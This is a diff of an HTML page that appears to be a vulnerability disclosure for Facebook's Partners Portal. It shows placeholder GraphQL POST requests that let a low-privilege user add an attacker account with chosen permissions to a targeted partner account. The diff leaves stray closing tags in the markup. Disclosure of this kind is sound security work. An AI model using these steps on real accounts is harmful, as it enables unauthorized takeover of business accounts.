@@ -56,7 +56,7 @@
 
 <p>1) Send a POST request to https://www.facebook.com/api/graphql/ with cookies that belongs to a user who has limited access to a Partners Portal account. with those parameters in the body:</p>
 
-<p><code class="language-plaintext highlighter-rouge">__a=1&amp;&lt;br&gt;&lt;/br&gt;fb_dtsg=CSRF_TOKEN&amp;&lt;br&gt;&lt;/br&gt;doc_id=REDACTED&amp;&lt;br&gt;&lt;/br&gt;variables={"id":"&lt;strong&gt;PARTNER_ID&lt;/strong&gt;","partner_type":"&lt;strong&gt;PARTNER_TYPE&lt;/strong&gt;"}</code></p>
+<p><code class="language-plaintext highlighter-rouge">__a=1&amp;&lt;br&gt;&lt;/br&gt;fb_dtsg=CSRF_TOKEN&amp;&lt;br&gt;&lt;/br&gt;doc_id=REDACTED&amp;&lt;br&gt;&lt;/br&gt;variables={"id":"PARTNER_ID&lt;/strong&gt;","partner_type":"PARTNER_TYPE&lt;/strong&gt;"}</code></p>
 
 <p><span class="has-inline-color has-vivid-red-color">PARTNER_ID</span> : targeted partner account id.<br />
 <span class="has-inline-color has-vivid-red-color">PARTNER_TYPE</span> : targeted partner portal account type (eg: fbs, xpp, opp)</p>
@@ -65,7 +65,7 @@
 
 <p>2) Send a POST request to https://www.facebook.com/api/graphql/ with cookies that belongs to a user who has limited access to a Partners Portal account. with those parameters in the body:</p>
 
-<p><code class="language-plaintext highlighter-rouge">__a=1&amp;&lt;br&gt;&lt;/br&gt;fb_dtsg=CSRF_TOKEN&amp;&lt;br&gt;&lt;/br&gt;doc_id=REDACTED&amp;&lt;br&gt;&lt;/br&gt;variables={"existing_partner_ids":&lt;strong&gt;PARTNER_ID&lt;/strong&gt;,"email":"&lt;strong&gt;ATTACKER_EMAIL&lt;/strong&gt;","user_id":&lt;strong&gt;ATTACKER_USER_ID&lt;/strong&gt;,"group_ids":&lt;strong&gt;&lt;strong&gt;PERMISSION_GROUP&lt;/strong&gt;&lt;/strong&gt;}</code></p>
+<p><code class="language-plaintext highlighter-rouge">__a=1&amp;&lt;br&gt;&lt;/br&gt;fb_dtsg=CSRF_TOKEN&amp;&lt;br&gt;&lt;/br&gt;doc_id=REDACTED&amp;&lt;br&gt;&lt;/br&gt;variables={"existing_partner_ids":PARTNER_ID&lt;/strong&gt;,"email":"ATTACKER_EMAIL&lt;/strong&gt;","user_id":ATTACKER_USER_ID&lt;/strong&gt;,"group_ids":PERMISSION_GROUP&lt;/strong&gt;&lt;/strong&gt;}</code></p>
 
 <p><span class="has-inline-color has-vivid-red-color">PARTNER_ID</span> : Targeted partner account id.<br />
 <span class="has-inline-color has-vivid-red-color">ATTACKER_EMAIL</span> : Email address associated to the attacker account in the portal.<br />
